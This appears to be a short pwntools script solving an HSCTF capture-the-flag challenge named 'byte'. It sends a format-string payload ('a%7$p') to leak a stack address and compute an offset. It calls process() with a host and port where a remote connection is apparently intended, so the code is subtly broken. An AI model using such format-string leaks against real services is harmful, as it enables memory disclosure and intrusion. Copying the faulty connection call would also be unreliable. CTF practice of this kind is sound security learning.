from pwn import *
#p = process('./byte')
p = process('pwn.hsctf.com',6666)
#gdb.attach(p)

p.recvuntil("Give me the address of the byte: ")
p.sendline("a%7$p")
leak = int("0x"+p.recvline()[3:11],16)
uk = leak - 314
print hex(uk)
p.interactive()
